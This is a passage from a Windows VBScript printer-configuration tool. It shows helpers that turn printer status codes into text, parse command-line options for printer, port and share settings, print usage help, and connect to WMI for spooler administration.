            str = str + L_Text_Msg_Status15_Text + L_Space_Text

        case 16
            str = str + L_Text_Msg_Status16_Text + L_Space_Text

        case 17
            str = str + L_Text_Msg_Status17_Text + L_Space_Text

        case 18
            str = str + L_Text_Msg_Status18_Text + L_Space_Text

    end select

    ExtPrnStatusToString = str

end function

'
' Converts the detected error state to a string
'
function DetectedErrorStateToString(Status)

    dim str

    str = L_Empty_Text

    select case Status

        case 0
            str = str + L_Text_Msg_Status02_Text + L_Space_Text

        case 1
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 2
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 3
            str = str + L_Text_Msg_Status20_Text + L_Space_Text

        case 4
            str = str + L_Text_Msg_Status21_Text + L_Space_Text

        case 5
            str = str + L_Text_Msg_Status22_Text + L_Space_Text

        case 6
            str = str + L_Text_Msg_Status23_Text + L_Space_Text

        case 7
            str = str + L_Text_Msg_Status24_Text + L_Space_Text

        case 8
            str = str + L_Text_Msg_Status25_Text + L_Space_Text

        case 9
            str = str + L_Text_Msg_Status07_Text + L_Space_Text

        case 10
            str = str + L_Text_Msg_Status26_Text + L_Space_Text

        case 11
            str = str + L_Text_Msg_Status27_Text + L_Space_Text

    end select

    DetectedErrorStateToString = str

end function

'
' Converts the extended detected error state to a string
'
function ExtDetectedErrorStateToString(Status)

    dim str

    str = L_Empty_Text

    select case Status

        case 0
            str = str + L_Text_Msg_Status02_Text + L_Space_Text

        case 1
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 2
            str = str + L_Text_Msg_Status01_Text + L_Space_Text

        case 3
            str = str + L_Text_Msg_Status20_Text + L_Space_Text

        case 4
            str = str + L_Text_Msg_Status21_Text + L_Space_Text

        case 5
            str = str + L_Text_Msg_Status22_Text + L_Space_Text

        case 6
            str = str + L_Text_Msg_Status23_Text + L_Space_Text

        case 7
            str = str + L_Text_Msg_Status24_Text + L_Space_Text

        case 8
            str = str + L_Text_Msg_Status25_Text + L_Space_Text

        case 9
            str = str + L_Text_Msg_Status07_Text + L_Space_Text

        case 10
            str = str + L_Text_Msg_Status26_Text + L_Space_Text

        case 11
            str = str + L_Text_Msg_Status27_Text + L_Space_Text

        case 12
            str = str + L_Text_Msg_Status28_Text + L_Space_Text

        case 13
            str = str + L_Text_Msg_Status29_Text + L_Space_Text

        case 14
            str = str + L_Text_Msg_Status30_Text + L_Space_Text

        case 15
            str = str + L_Text_Msg_Status31_Text + L_Space_Text

        case 16
            str = str + L_Text_Msg_Status32_Text + L_Space_Text

    end select

    ExtDetectedErrorStateToString = str

end function

'
' Debug display helper function
'
sub DebugPrint(uFlags, strString)

    if gDebugFlag = true then

        if uFlags = kDebugTrace then

            wscript.echo L_Debug_Text & L_Space_Text & strString

        end if

        if uFlags = kDebugError then

            if Err <> 0 then

                wscript.echo L_Debug_Text & L_Space_Text & strString & L_Space_Text _
                             & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                             & L_Space_Text & Err.Description

            end if

        end if

    end if

end sub

'
' Parse the command line into its components
'
function ParseCommandLine(iAction, oParamdict)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg05_Text

    dim oArgs
    dim iIndex

    iAction = kActionUnknown
    iIndex = 0

    set oArgs = wscript.Arguments

    while iIndex < oArgs.Count

        select case oArgs(iIndex)

            case "-g"
                iAction = kActionGet

            case "-t"
                iAction = kActionSet

            case "-x"
                iAction = kActionRename

            case "-p"
                iIndex = iIndex + 1
                oParamdict.Add kPrinterName, oArgs(iIndex)

            case "-s"
                iIndex = iIndex + 1
                oParamdict.Add kServerName, RemoveBackslashes(oArgs(iIndex))

            case "-r"
                iIndex = iIndex + 1
                oParamdict.Add kPortName, oArgs(iIndex)

            case "-h"
                iIndex = iIndex + 1
                oParamdict.Add kShareName, oArgs(iIndex)

            case "-m"
                iIndex = iIndex + 1
                oParamdict.Add kComment, oArgs(iIndex)

            case "-l"
                iIndex = iIndex + 1
                oParamdict.Add kLocation, oArgs(iIndex)

            case "-y"
                iIndex = iIndex + 1
                oParamdict.Add kDataType, oArgs(iIndex)

            case "-f"
                iIndex = iIndex + 1
                oParamdict.Add kSepFile, oArgs(iIndex)

            case "-z"
                iIndex = iIndex + 1
                oParamdict.Add kNewPrinterName, oArgs(iIndex)

            case "-u"
                iIndex = iIndex + 1
                oParamdict.Add kUserName, oArgs(iIndex)

            case "-w"
                iIndex = iIndex + 1
                oParamdict.Add kPassword, oArgs(iIndex)

            case "-st"
                iIndex = iIndex + 1
                oParamdict.Add kStartTime, "********" & oArgs(iIndex) & "00.000000+000"

            case "-o"
                iIndex = iIndex + 1
                oParamdict.Add kPriority, oArgs(iIndex)

            case "-i"
                iIndex = iIndex + 1
                oParamdict.Add kDefaultPriority, oArgs(iIndex)

            case "-ut"
                iIndex = iIndex + 1
                oParamdict.Add kUntilTime, "********" & oArgs(iIndex) & "00.000000+000"

            case "-queued"
                oParamdict.Add kQueued, false

            case "+queued"
                oParamdict.Add kQueued, true

            case "-direct"
                oParamdict.Add kDirect, false

            case "+direct"
                oParamdict.Add kDirect, true

            case "-shared"
                oParamdict.Add kShared, false

            case "+shared"
                oParamdict.Add kShared, true

            case "-hidden"
                oParamdict.Add kHidden, false

            case "+hidden"
                oParamdict.Add kHidden, true

            case "-enabledevq"
                oParamdict.Add kEnabledevq, false

            case "+enabledevq"
                oParamdict.Add kEnabledevq, true

            case "-keepprintedjobs"
                oParamdict.Add kKeepprintedjobs, false

            case "+keepprintedjobs"
                oParamdict.Add kKeepprintedjobs, true

            case "-docompletefirst"
                oParamdict.Add kDocompletefirst, false

            case "+docompletefirst"
                oParamdict.Add kDocompletefirst, true

            case "-workoffline"
                oParamdict.Add kWorkoffline, false

            case "+workoffline"
                oParamdict.Add kWorkoffline, true

            case "-enablebidi"
                oParamdict.Add kEnablebidi, false

            case "+enablebidi"
                oParamdict.Add kEnablebidi, true

            case "-rawonly"
                oParamdict.Add kRawonly, false

            case "+rawonly"
                oParamdict.Add kRawonly, true

            case "-published"
                oParamdict.Add kPublished, false

            case "+published"
                oParamdict.Add kPublished, true

            case "-?"
                Usage(true)
                exit function

            case else
                Usage(true)
                exit function

        end select

        iIndex = iIndex + 1

    wend

    if Err = kErrorSuccess then

        ParseCommandLine = kErrorSuccess

    else

        wscript.echo L_Text_Error_General02_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_text & Err.Description

        ParseCommandLine = kErrorFailure

    end if

end function

'
' Display command usage.
'
sub Usage(bExit)

    wscript.echo L_Help_Help_General01_Text
    wscript.echo L_Help_Help_General02_Text
    wscript.echo L_Help_Help_General03_Text
    wscript.echo L_Help_Help_General04_Text
    wscript.echo L_Help_Help_General05_Text
    wscript.echo L_Help_Help_General06_Text
    wscript.echo L_Help_Help_General07_Text
    wscript.echo L_Help_Help_General08_Text
    wscript.echo L_Help_Help_General09_Text
    wscript.echo L_Help_Help_General10_Text
    wscript.echo L_Help_Help_General11_Text
    wscript.echo L_Help_Help_General12_Text
    wscript.echo L_Help_Help_General13_Text
    wscript.echo L_Help_Help_General14_Text
    wscript.echo L_Help_Help_General15_Text
    wscript.echo L_Help_Help_General16_Text
    wscript.echo L_Help_Help_General17_Text
    wscript.echo L_Help_Help_General18_Text
    wscript.echo L_Help_Help_General19_Text
    wscript.echo L_Help_Help_General20_Text
    wscript.echo L_Help_Help_General21_Text
    wscript.echo L_Help_Help_General22_Text
    wscript.echo L_Help_Help_General23_Text
    wscript.echo L_Help_Help_General24_Text
    wscript.echo L_Help_Help_General25_Text
    wscript.echo L_Help_Help_General26_Text
    wscript.echo L_Help_Help_General27_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General28_Text
    wscript.echo L_Help_Help_General29_Text
    wscript.echo L_Help_Help_General30_Text
    wscript.echo L_Help_Help_General31_Text
    wscript.echo L_Help_Help_General32_Text
    wscript.echo L_Help_Help_General33_Text
    wscript.echo L_Help_Help_General34_Text
    wscript.echo L_Help_Help_General35_Text

    if bExit then

        wscript.quit(1)

    end if

end sub

'
' Determines which program is being used to run this script.
' Returns true if the script host is cscript.exe
'
function IsHostCscript()

    on error resume next

    dim strFullName
    dim strCommand
    dim i, j
    dim bReturn

    bReturn = false

    strFullName = WScript.FullName

    i = InStr(1, strFullName, ".exe", 1)

    if i <> 0 then

        j = InStrRev(strFullName, "\", i, 1)

        if j <> 0 then

            strCommand = Mid(strFullName, j+1, i-j-1)

            if LCase(strCommand) = "cscript" then

                bReturn = true

            end if

        end if

    end if

    if Err <> 0 then

        wscript.echo L_Text_Error_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

    end if

    IsHostCscript = bReturn

end function

'
' Retrieves extended information about the last error that occurred
' during a WBEM operation. The methods that set an SWbemLastError
' object are GetObject, PutInstance, DeleteInstance
'
sub LastError()

    on error resume next

    dim oError

    set oError = CreateObject("WbemScripting.SWbemLastError")

    if Err = kErrorSuccess then

        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
        wscript.echo L_Text_Error_General03_Text & L_Space_Text & oError.StatusCode

    end if

end sub

'
' Connects to the WMI service on a server. oService is returned as a service
' object (SWbemServices)
'
function WmiConnect(strServer, strNameSpace, strUser, strPassword, oService)

    on error resume next

    dim oLocator
    dim bResult

    oService = null

    bResult  = false

    set oLocator = CreateObject("WbemScripting.SWbemLocator")

    if Err = kErrorSuccess then

        set oService = oLocator.ConnectServer(strServer, strNameSpace, strUser, strPassword)

        if Err = kErrorSuccess then

            bResult = true

            oService.Security_.impersonationlevel = 3

            '
            ' Required to perform administrative tasks on the spooler service
            '
            oService.Security_.Privileges.AddAsString "SeLoadDriverPrivilege"

            Err.Clear

        else

            wscript.echo L_Text_Msg_General08_Text & L_Space_Text & L_Error_Text _
                         & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General09_Text & L_Space_Text & L_Error_Text _
                     & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

    end if

    WmiConnect = bResult

end function

'
' Remove leading "\\" from server name
'
function RemoveBackslashes(strServer)

    dim strRet

    strRet = strServer

    if Left(strServer, 2) = "\\" and Len(strServer) > 2 then

        strRet = Mid(strServer, 3)

    end if

    RemoveBackslashes = strRet

end function
